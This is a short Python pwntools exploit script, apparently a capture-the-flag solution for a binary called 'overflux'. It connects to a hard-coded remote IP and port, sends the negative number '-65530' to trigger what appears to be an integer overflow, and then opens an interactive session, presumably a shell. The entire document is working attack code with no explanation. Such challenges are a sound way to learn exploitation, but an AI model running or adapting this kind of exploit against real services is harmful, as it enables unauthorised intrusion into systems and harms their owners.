#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or '../pub/overflux')

host = args.HOST or '54.92.51.205'
port = int(args.PORT or 10002)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

io = start()
io.sendlineafter(b"(0 to finish):",b"-65530")
io.sendlineafter(b"(0 to finish):",b"0")

io.interactive()